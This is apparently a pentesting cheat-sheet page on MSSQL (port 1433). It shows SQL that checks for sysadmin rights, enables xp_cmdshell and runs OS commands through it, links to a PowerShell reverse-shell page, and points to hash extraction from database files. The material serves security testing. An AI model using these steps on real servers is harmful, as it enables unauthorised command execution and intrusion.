# 1433 - MSSQL

## Connect to MSSQL from Kali

{% content-ref url="../../tools/tools/mssqlclient.py-impacket.md" %}
[mssqlclient.py-impacket.md](../../tools/tools/mssqlclient.py-impacket.md)
{% endcontent-ref %}

## MSSQL for PrivEsc

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
-----------
          1

EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;

EXEC sp_configure 'xp_cmdshell', 1
reconfigure;

xp_cmdshell "whoami"
```

{% hint style="info" %}
Compare the following syntax (note the `;)`

* `EXEC xp_cmdshell "whoami";`
* `xp_cmdshell "whoami"`
{% endhint %}

{% content-ref url="../../collections/reverse-shell/powershell.md" %}
[powershell.md](../../collections/reverse-shell/powershell.md)
{% endcontent-ref %}

## MSSQL System Databases

Documentation: [https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sqlallproducts-allversions](https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sqlallproducts-allversions)

To restore backups (.bak) or read database files (.mdf and .ldf) offline:&#x20;

* [https://blog.xpnsec.com/extracting-master-mdf-hashes/](https://blog.xpnsec.com/extracting-master-mdf-hashes/)
* [https://rastating.github.io/from-lfi-to-sql-database-backup/](https://rastating.github.io/from-lfi-to-sql-database-backup/)
